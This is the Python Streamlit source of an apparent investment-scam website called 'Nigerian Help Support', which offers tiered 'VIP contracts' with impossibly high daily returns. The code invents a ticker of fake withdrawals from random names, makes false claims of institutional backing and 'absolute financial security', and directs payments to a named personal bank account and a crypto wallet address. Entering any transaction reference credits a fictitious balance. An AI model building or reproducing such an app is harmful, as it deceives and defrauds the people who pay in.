import streamlit as st
import pandas as pd
import random
from datetime import datetime

# --- PAGE CONFIGURATION & THEME ---
st.set_page_config(
    page_title="NHS - Nigerian Help Support",
    page_icon="📈",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# Professional Corporate Styling
st.markdown("""
    <style>
    .stApp { background-color: #f8fafc; color: #1e293b; }
    .product-card {
        background-color: #ffffff; padding: 24px; border-radius: 12px;
        box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); border: 1px solid #e2e8f0;
        margin-bottom: 20px;
    }
    .ticker-box {
        background-color: #0f172a; color: #38bdf8; padding: 12px; 
        border-radius: 8px; font-family: 'Courier New', monospace; font-size: 14px;
    }
    .badge-vip {
        background-color: #10b981; color: white; padding: 4px 12px; 
        border-radius: 20px; font-weight: bold; font-size: 14px;
    }
    div.stButton > button:first-child {
        background-color: #059669; color: white; border: none; border-radius: 6px; width: 100%; font-weight: 600;
    }
    </style>
""", unsafe_allow_html=True)

# --- INITIALIZE MOCK DATABASE ---
if "registered" not in st.session_state:
    st.session_state.registered = False
if "username" not in st.session_state:
    st.session_state.username = "Guest User"
if "user_vip" not in st.session_state:
    st.session_state.user_vip = "Normal User"
if "active_investments" not in st.session_state:
    st.session_state.active_investments = []
if "wallet_balance" not in st.session_state:
    st.session_state.wallet_balance = 0.00
if "ticker_logs" not in st.session_state:
    names = ["Damilola", "Chidi", "Aminu", "Blessing", "Funmi", "Ngozi", "Tunde", "Emeka"]
    st.session_state.ticker_logs = [f"🟢 {random.choice(names)} has successfully withdrawn ₦{random.randint(50, 150)*1000:,.2f}" for _ in range(5)]

# VIP Tiers Data
VIP_TIERS = {
    "VIP 1": {"cost": 5000, "daily": 1150, "days": 30, "product": "Premium High-Yield Agricultural Assets"},
    "VIP 2": {"cost": 15000, "daily": 2700, "days": 20, "product": "Strategic Petroleum Derivatives"},
    "VIP 3": {"cost": 40000, "daily": 6000, "days": 20, "product": "Pan-Asian Tech Venture Capital"},
    "VIP 4": {"cost": 85000, "daily": 10500, "days": 20, "product": "Automated Sovereign Bond Units"},
    "VIP 5": {"cost": 130000, "daily": 15000, "days": 20, "product": "Global Maritime Supply-Chain Blocks"}
}

# --- REGISTRATION ---
if not st.session_state.registered:
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.write("")
        st.markdown("<h1 style='text-align: center; color: #0f172a;'>NHS</h1>", unsafe_allow_html=True)
        st.markdown("<p style='text-align: center; color: #64748b;'>NIGERIAN HELP SUPPORT SYSTEM</p>", unsafe_allow_html=True)
        with st.container():
            reg_user = st.text_input("Username")
            reg_email = st.text_input("Email")
            reg_pass = st.text_input("Password", type="password")
            if st.button("PROCEED TO VERIFICATION"):
                if reg_user and reg_email and reg_pass:
                    st.session_state.username = reg_user
                    st.session_state.registered = True
                    st.rerun()
    st.stop()

# --- NAVIGATION ---
current_tab = st.radio("Nav", ["Home", "Invest", "My"], horizontal=True, label_visibility="collapsed")
st.markdown("---")

# --- HOME ---
if current_tab == "Home":
    st.markdown("<h1 style='color: #0f172a;'>NIGERIAN HELP SUPPORT (NHS)</h1>", unsafe_allow_html=True)
    st.markdown(f"<div class='ticker-box'><marquee>{' &nbsp;&nbsp;||&nbsp;&nbsp; '.join(st.session_state.ticker_logs)}</marquee></div>", unsafe_allow_html=True)
    st.write("")
    st.markdown("#### Institutional Asset Management")
    st.info("""**Nigerian Help Support (NHS)** is a Tier-1 conglomerate structured to drive economic stability. Partnering with North Asian infrastructure networks, NHS aggregates capital to finance high-performing commodities, delivering absolute financial security with daily liquid payouts.""")
    st.image("https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=800&q=80")

# --- INVEST ---
elif current_tab == "Invest":
    st.markdown("<h2 style='color: #0f172a;'>Premium Portfolios</h2>", unsafe_allow_html=True)
    
    for tier, details in VIP_TIERS.items():
        with st.container():
            st.markdown(f"""
            <div class='product-card'>
                <div style='display: flex; justify-content: space-between;'>
                    <span style='font-size: 20px; font-weight: bold;'>{tier} : {details['product']}</span>
                    <span class='badge-vip'>{tier}</span>
                </div>
                <hr>
                <div style='display: flex; justify-content: space-between;'>
                    <div><b>Principal:</b> ₦{details['cost']:,.2f}</div>
                    <div><b>Daily:</b> ₦{details['daily']:,.2f}</div>
                    <div><b>Lock-in:</b> {details['days']} Days</div>
                </div>
            </div>
            """, unsafe_allow_html=True)
            if st.button(f"ACQUIRE {tier} CONTRACT", key=tier):
                st.session_state.selected_tier = tier
                st.session_state.selected_details = details
                st.session_state.page_state = "Clearing"
                st.rerun()

    if "page_state" in st.session_state and st.session_state.page_state == "Clearing":
        st.markdown("---")
        st.markdown("<h3 style='color: #b91c1c;'>🚨 SECURE CLEARING GATEWAY</h3>", unsafe_allow_html=True)
        
        method = st.radio("Select Payment Method", ["Bank Transfer", "Cryptocurrency (BEP20)"], horizontal=True)
        
        if method == "Bank Transfer":
            st.info(f"""
            **Official Settlement Account:**
            * **Bank:** MONIEPOINT
            * **Account Number:** 8126419410
            * **Account Name:** Eric Kingsley Edet
            * **Amount:** ₦{st.session_state.selected_details['cost']:,.2f}
            """)
        else:
            st.info(f"""
            **Digital Asset Settlement:**
            * **Wallet Address:** `0xb3b9c10CDb2301FA678C7789dD1cFfDB228e202E`
            * **Network:** BNB Smart Chain (BEP20)
            * **Note:** Ensure you use the BEP20 network to avoid loss of funds.
            """)
            
        tx_ref = st.text_input("Enter Transaction Ref / Session ID / TXID")
        if st.button("CONFIRM AND BIND CONTRACT"):
            if tx_ref:
                st.session_state.user_vip = st.session_state.selected_tier
                st.session_state.active_investments.append({
                    "Tier": st.session_state.selected_tier,
                    "Principal": st.session_state.selected_details['cost'],
                    "Daily": st.session_state.selected_details['daily'],
                    "Remaining": st.session_state.selected_details['days'],
                    "Status": "Locked"
                })
                st.session_state.wallet_balance += st.session_state.selected_details['daily']
                del st.session_state.page_state
                st.success("Verification complete. Level upgraded!")
                st.rerun()

# --- MY ---
elif current_tab == "My":
    st.markdown(f"## Account Node: @{st.session_state.username}")
    col1, col2 = st.columns([1, 2])
    with col1:
        st.markdown(f"""
        <div style='background-color: #0f172a; color: white; padding: 20px; border-radius: 12px; text-align: center;'>
            <p>Status: {st.session_state.user_vip}</p>
            <h2>₦{st.session_state.wallet_balance:,.2f}</h2>
        </div>
        """, unsafe_allow_html=True)
    with col2:
        st.write("#### Active Staking Matrix")
        if st.session_state.active_investments:
            st.table(pd.DataFrame(st.session_state.active_investments))
        else:
            st.write("No active investments.")
            
    st.markdown("---")
    st.markdown("<div style='font-size: 11px; color: #64748b; text-align: center;'>APPROVED BY NHPC | SUPPORTED BY GLOBAL STRATEGIC PARTNERS</div>", unsafe_allow_html=True)
